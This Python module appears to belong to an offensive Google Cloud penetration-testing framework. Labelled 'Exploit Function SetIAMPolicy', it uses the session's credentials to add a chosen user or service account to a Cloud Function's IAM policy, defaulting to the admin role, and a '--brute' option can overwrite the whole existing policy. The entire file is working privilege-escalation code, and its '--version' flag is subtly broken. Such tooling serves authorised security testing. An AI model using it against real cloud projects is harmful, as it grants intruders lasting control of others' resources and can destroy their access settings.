from Modules.CloudFunctions.utils.util_helpers import *

# Entrypoint
def run_module(user_args, session, first_run = False, last_run = False):
    
    # Set up Argparser to handle flag arguments
    parser = argparse.ArgumentParser(description="Exploit Function SetIAMPolicy", allow_abbrev=False)
    
    # Debug/non-module specific
    parser.add_argument("-v","--debug",action="store_true",required=False,help="Get verbose data during the module run")
        
    # Module specific arguments
    parser.add_argument("--function-name", type=str, required=False,  help="Function name to set IAM policy on (format - projects/<project_id>/locations/<region>/functions/<function-name>)")
    
    parser.add_argument("--role", type=str, required=False,  help="Role to add (format - roles/<role_name>)")
    parser.add_argument("--member", type=str, required=False,  help="User to add to the policy at the given role (format - user:<email> / serviceAccount:<email>)")
    parser.add_argument("--version", type=int, required=False,  help="Version fo target function")

    parser.add_argument("--brute", action="store_true", required=False,  help="If current policy is unknown, potentially rewrite all policy")

    args = parser.parse_args(user_args)

    # Set debug flag
    debug = args.debug

    function_name, member, role = None, None, None


    function_version = None
    if args.version:
        if args.version == "1": function_version = 1
        elif args.version == "2":  function_version = 2

   
    if args.function_name:

        if check_function_format(args.function_name):
            function_name = args.function_name
        else:
            print("[X] Incorrect \"function-name\" format. Ex. projects/[project-id]/locations/[location]/functions/[function-simple-name]")
            return -1

    if args.member:
        member = args.member

    if args.role:
        role = args.role

    function_client_v2 = functions_v2.FunctionServiceClient(credentials=session.credentials)
    
    if not function_name:
        rows_returned = session.get_data("cloudfunctions-functions", columns = ["name","environment"])
        if len(rows_returned) == 0:
            print("[X] No functions were found when running the module. Consider passing in the specified function name with --function-name flag when running the module again")
            return -1
        
        # Return dictionary corresponding to user choice
        function_dict = session.choice_selector(rows_returned,"Choose an existing function from below to set the IAM policy:", fields=["name"])
        if function_dict:

            # Project ID could be "Unknown"
            function_name = function_dict["name"]
            
            environment = function_dict["environment"]
            if not function_version:
                if environment == "1": function_version = 1
                elif environment == "2": function_version = 2

        else:
            print("[X] Exiting...")
            return None

    if not member:
        member = session.choose_member()
        if not member:
            print("Exiting...")
            return -1


    if not role:
        allowed_function_roles_menu = [
            "roles/cloudfunctions.admin (Default)",
            "roles/cloudfunctions.developer",
            "roles/cloudfunctions.invoker",
            "roles/cloudfunctions.viewer"
        ]
        role =  session.choose_role(allowed_function_roles_menu, chosen_role = args.role, default_role = "roles/cloudfunctions.admin")
        if not role:
            print("Exiting...")
            return -1

    if debug:
        print(f"[DEBUG] Proceeding with:\n  Function:{function_name} (Version:{function_version})\n")
        print(f"[DEBUG] Proceeding with member: {member}")
        print(f"[DEBUG] Proceeding with role: {role}")


    print(f"[*] Binding Member {member} on {function_name} to role {role}")

    project_id = function_name.split("/")[1]  

    action_dict = {}

    status = add_function_iam_member(function_client_v2, function_name, member, action_dict,function_version, brute = args.brute, role = role, debug=debug)

    if status:
        print(f"[*] Successfully added {member} to the policy of function {function_name}")
            
    if action_dict:
        session.insert_actions(action_dict, project_id, column_name = "function_actions_allowed") 